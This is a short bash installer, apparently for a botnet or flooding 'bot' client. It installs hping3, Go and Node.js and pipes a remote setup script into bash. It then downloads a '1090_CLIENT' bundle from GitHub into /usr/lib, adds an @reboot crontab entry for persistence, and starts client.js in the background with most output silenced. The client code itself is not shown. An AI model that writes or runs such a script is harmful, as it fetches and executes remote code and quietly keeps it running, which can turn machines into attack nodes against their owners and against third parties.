#!/bin/bash

#Bot setup V2 1090 - Debian Version
#Adding startup support for client.
#Making client run forever.

#define static variables.
NODE_URL="https://deb.nodesource.com/setup_10.x"                                                #V10 most stable release.
GOLANG_URL_64="https://storage.googleapis.com/golang/go1.8.3.linux-amd64.tar.gz"                #go 64
GOLANG_URL_32="https://storage.googleapis.com/golang/go1.8.3.linux-386.tar.gz"                  #go 32

CLIENT_SRC_URL="https://github.com/allf1090/hx2_1090/raw/main/1090_CLIENT.zip"                  #client install bundle.
CLIENT_INSTALL_DIR="/usr/lib/"                                                                  #client install root dir
CLIENT_INSTALL_NAME="1090_CLIENT"                                                               #client install name
CLIENT_FULL_PATH=$CLIENT_INSTALL_DIR$CLIENT_INSTALL_NAME                                        #client root dir

#define dynamic variables.
CWD=$(pwd)                                                                                      #current working dir
HOSTN=$(hostname)                                                                               #get hostname
arch=$(uname -m)                                                                                #get arch

echo "Updating and Installing dependencies [unzip, golang, nodejs, hping3, cron]"
apt-get update -y > /dev/null 2>&1
apt-get install -y curl wget unzip hping3 cron > /dev/null 2>&1

#install golang
if [ "$arch" == 'x86_64' ]
then
    wget $GOLANG_URL_64 > /dev/null 2>&1
    tar -zxvf "${CWD}/go1.8.3.linux-amd64.tar.gz" -C /usr/local > /dev/null 2>&1
    rm -r "${CWD}/go1.8.3.linux-amd64.tar.gz"
    echo "golang  ->  done"
else
    wget $GOLANG_URL_32 > /dev/null 2>&1
    tar -zxvf "${CWD}/go1.8.3.linux-386.tar.gz" -C /usr/local > /dev/null 2>&1
    rm -r "${CWD}/go1.8.3.linux-386.tar.gz"
    echo "golang  ->  done"
fi

#getting nodejs updated version.
echo "Installing nodejs stable version."
curl -sL $NODE_URL | bash - > /dev/null 2>&1
apt-get install -y nodejs > /dev/null 2>&1
echo "Nodejs install success"


echo "Installing client ..."
wget $CLIENT_SRC_URL > /dev/null 2>&1
#rm -r $CLIENT_FULL_PATH                                                                        #removing current client
unzip -o "${CLIENT_INSTALL_NAME}.zip" -d "${CLIENT_INSTALL_DIR}" 
rm -r "${CLIENT_INSTALL_NAME}.zip"

echo "adding to startup"
#echo new cron into cron file
(crontab -l ; echo "@reboot node ${CLIENT_FULL_PATH}/client.js") | crontab -
#install new cron file
echo "start up added"

echo "starting up the client ..."
node "${CLIENT_FULL_PATH}/client.js" &
echo "client running in the background"
